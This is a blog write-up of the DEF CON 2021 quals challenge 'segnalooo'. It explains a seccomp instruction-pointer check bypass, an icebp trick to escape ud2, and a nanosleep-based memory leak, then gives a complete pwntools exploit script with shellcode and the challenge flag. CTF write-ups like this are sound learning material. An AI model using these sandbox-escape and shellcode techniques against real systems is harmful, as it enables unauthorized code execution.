<!DOCTYPE html>
<html lang="en-us">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> Defcon-2021-Segnalooo | mhibio</title>
  <meta name="description" content="Hi">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="Defcon-2021-Segnalooo" />
<meta property="og:description" content="It&rsquo;s the first problem I solved at Defcon.
and, Because I played the defcon, I messed up the exam.ðŸ˜‚
Solved with Jsec, Epist
Tl;dr Trick on Seccomp Filter&rsquo;s check.
Brute force shellcoding challenge.
Excute execveat(0, &quot;/bin/sh&quot;, 0, 0, 0) after bypass seccomp filter.
Binary Set Signal Handler on Signum 5 ( SIGTRAP ) Allocate Memory twice ( addr1 : 0x10XXXXXXXXXX, addr2 : 0x5XXXXXXXXXXX )
1-1. Input our Shellcode. Munmap all Memory except addr1, addr2 Call Signal Handler with int3 After Signal Handler, IP returns to our Shellcode." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://mhibio.github.io/post/defcon-2021-segnalooo/" />
<meta property="article:published_time" content="2021-05-06T21:53:09+09:00" />
<meta property="article:modified_time" content="2021-05-06T21:53:09+09:00" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Defcon-2021-Segnalooo"/>
<meta name="twitter:description" content="It&rsquo;s the first problem I solved at Defcon.
and, Because I played the defcon, I messed up the exam.ðŸ˜‚
Solved with Jsec, Epist
Tl;dr Trick on Seccomp Filter&rsquo;s check.
Brute force shellcoding challenge.
Excute execveat(0, &quot;/bin/sh&quot;, 0, 0, 0) after bypass seccomp filter.
Binary Set Signal Handler on Signum 5 ( SIGTRAP ) Allocate Memory twice ( addr1 : 0x10XXXXXXXXXX, addr2 : 0x5XXXXXXXXXXX )
1-1. Input our Shellcode. Munmap all Memory except addr1, addr2 Call Signal Handler with int3 After Signal Handler, IP returns to our Shellcode."/>

  
  
    
  
  
  <link rel="stylesheet" href="https://mhibio.github.io/css/style-dark.css">
  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://mhibio.github.io/images/favicon.ico" />

  
  
  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

    <header id="header">
  <a href="https://mhibio.github.io">
    
  <div id="title">
    <h1>mhibio</h1>
  </div>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#" aria-label="Menu"><i class="fas fa-bars fa-2x" aria-hidden="true"></i></a>
      </li>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/post">Writings</a></li>
      
        <li><a href="/whoami">About</a></li>
      
    </ul>
  </div>
</header>



    
<article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <div class="content" itemprop="articleBody">
  
    <p>It&rsquo;s the first problem I solved at Defcon.<br>
and, Because I played the defcon, I messed up the exam.ðŸ˜‚</p>
<p><strong>Solved with <code>Jsec</code>, <code>Epist</code></strong></p>
<h2 id="tldr">Tl;dr</h2>
<p><strong><code>Trick</code> on Seccomp Filter&rsquo;s check.</strong><br>
<strong><code>Brute force shellcoding</code> challenge.</strong><br>
<strong>Excute <code>execveat(0, &quot;/bin/sh&quot;, 0, 0, 0)</code> after bypass seccomp filter.</strong></p>
<h2 id="binary">Binary</h2>
<ol start="0">
<li>Set Signal Handler on Signum 5 ( <code>SIGTRAP</code> )</li>
<li>Allocate Memory twice ( addr1 : <code>0x10XXXXXXXXXX</code>, addr2 : <code>0x5XXXXXXXXXXX</code> )<br>
1-1. Input our Shellcode.</li>
<li>Munmap all Memory except addr1, addr2</li>
<li>Call Signal Handler with <code>int3</code></li>
<li>After Signal Handler, <code>IP</code> returns to our Shellcode.<br>
=&gt; There is two Problems. ( Seccomp filter, <code>ud2</code> instruction )</li>
</ol>
<h2 id="seccomp-filter">Seccomp Filter</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> line  CODE  JT   JF      K
<span style="color:#f92672">=================================</span>
 <span style="color:#ae81ff">0000</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000004</span>  A <span style="color:#f92672">=</span> arch
 <span style="color:#ae81ff">0001</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x0a</span> <span style="color:#ae81ff">0xc000003e</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">!=</span> ARCH_X86_64) goto <span style="color:#ae81ff">0012</span>
 <span style="color:#ae81ff">0002</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  A <span style="color:#f92672">=</span> sys_number
 <span style="color:#ae81ff">0003</span>: <span style="color:#ae81ff">0x35</span> <span style="color:#ae81ff">0x08</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x40000000</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0x40000000</span>) goto <span style="color:#ae81ff">0012</span>
 <span style="color:#ae81ff">0004</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x0000000b</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> munmap) goto <span style="color:#ae81ff">0011</span>
 <span style="color:#ae81ff">0005</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x05</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000023</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> nanosleep) goto <span style="color:#ae81ff">0011</span>
 <span style="color:#ae81ff">0006</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000008</span>  A <span style="color:#f92672">=</span> instruction_pointer
 <span style="color:#ae81ff">0007</span>: <span style="color:#ae81ff">0x25</span> <span style="color:#ae81ff">0x04</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x80000000</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x80000000</span>) goto <span style="color:#ae81ff">0012</span>
 <span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  A <span style="color:#f92672">=</span> sys_number
 <span style="color:#ae81ff">000</span><span style="color:#ae81ff">9</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x02</span> <span style="color:#ae81ff">0x01</span> <span style="color:#ae81ff">0x0000003b</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> execve) goto <span style="color:#ae81ff">0012</span> <span style="color:#66d9ef">else</span> goto <span style="color:#ae81ff">0011</span>
 <span style="color:#ae81ff">0010</span>: <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  <span style="color:#66d9ef">return</span> KILL
 <span style="color:#ae81ff">0011</span>: <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x7fff0000</span>  <span style="color:#66d9ef">return</span> ALLOW
 <span style="color:#ae81ff">0012</span>: <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  <span style="color:#66d9ef">return</span> KILL
</code></pre></div><p>Only <code>munmap</code> and <code>nanosleep</code> Syscall are available.<br>
or, <code>Instruction_Pointer(IP)</code> have to be smaller than 0x80000000</p>
<p><strong>But, all Memory is bigger than <code>0x80000000</code>.</strong><br>
<strong>All Syscall gadgets fail to bypass <code>IP CHECK</code>.</strong><br>
<strong>How can I bypass <code>IP check</code>?</strong></p>
<blockquote>
<p>One interesting thing is that Seccomp only do 4 bytes of ip check.</p>
</blockquote>
<p>So we can bypass <strong><code>IP CHECK</code></strong> by using a syscall gadget in <code>0x10XXXXXXXXXX</code>.<br>
( Binary always causes 4 bytes of addr1 address (<code>0x10XXXXXXXXXX</code>) to be smaller than <code>0x80000000</code> )</p>
<h2 id="ud2-instruction">ud2 instruction</h2>
<p><code>ud2 instruction</code> means undefined instruction.<br>
when <code>IP</code> returns to our shellcode, <code>ud2</code> instruction is executed.<br>
-&gt; Process stopped with exit code -4 ( <code>SIGILL</code> )</p>
<p>But, I can execute only 1 instruction.<br>
<strong>if I execute <code>icebp (0xf1)</code>, I can escape <code>ud2</code> instruction.</strong></p>
<h2 id="leak-memory">leak memory</h2>
<p>if <code>nanosleep's rdi</code> is invalid memory, return <code>0xfffffffffffffff2</code>.<br>
else <code>nanosleep's rdi</code> is valid memory but failed <code>nanosleep</code>, return <code>0xffffffffffffffea</code>.</p>
<p>so we can leak memory <code>0x10XXXXXXXXXX</code> by brute force<br>
then, just excute <code>execveat(0, &quot;/bin/sh&quot;, 0, 0, 0)</code></p>
<h2 id="exploit">Exploit</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>)
context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pack64</span>(x):  <span style="color:#66d9ef">return</span> p64(x)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;hex&#34;</span>)

sc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">inc edi
</span><span style="color:#e6db74">shl rdi, 44
</span><span style="color:#e6db74">mov rsi, rsp
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">add rdi, 0x1000
</span><span style="color:#e6db74">xor rax, rax
</span><span style="color:#e6db74">mov al, 35
</span><span style="color:#e6db74">syscall
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">cmp al, 0xea
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>

sc2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">lea rbx, [rdi+0xb4]
</span><span style="color:#e6db74">lea rsi, [rsp+0x30]
</span><span style="color:#e6db74">xor rdi, rdi
</span><span style="color:#e6db74">xor eax, eax
</span><span style="color:#e6db74">mov ax, 322
</span><span style="color:#e6db74">jmp rbx
</span><span style="color:#e6db74">nop
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>

pay <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;f1&#34;</span><span style="color:#f92672">+</span> asm(sc)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;hex&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;7405e9e6ffffff&#34;</span> <span style="color:#f92672">+</span> asm(sc2)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;hex&#34;</span>)
pay <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;41&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x40</span> <span style="color:#f92672">-</span> (len(pay) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>))
pay <span style="color:#f92672">+=</span> pack64(<span style="color:#ae81ff">0</span>)
pay <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;90&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
pay <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;2f62696e2f7368&#34;</span> <span style="color:#75715e">#binsh</span>

<span style="color:#66d9ef">while</span> True:
    <span style="color:#75715e">#p = process(&#39;./stub&#39;)</span>
    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;segnalooo.challenges.ooo&#34;</span>, <span style="color:#ae81ff">4321</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Give me some code!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pay)
    p<span style="color:#f92672">.</span>recvline()
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
            p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;while read line;do echo </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">$line</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">;done &lt; /flag&#34;</span>)
    res <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
    <span style="color:#66d9ef">if</span> len(res) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
            <span style="color:#66d9ef">print</span>(res)
            exit()
</code></pre></div><h2 id="flag--ooos3riouslywh4tissigaltstack">Flag : OOO{s3riously,wh4tISsigaltstack???}</h2>

  
  </div>
</article>


    <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2021  mhibio 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/post">Writings</a></li>
         
        <li><a href="/whoami">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>
</html>
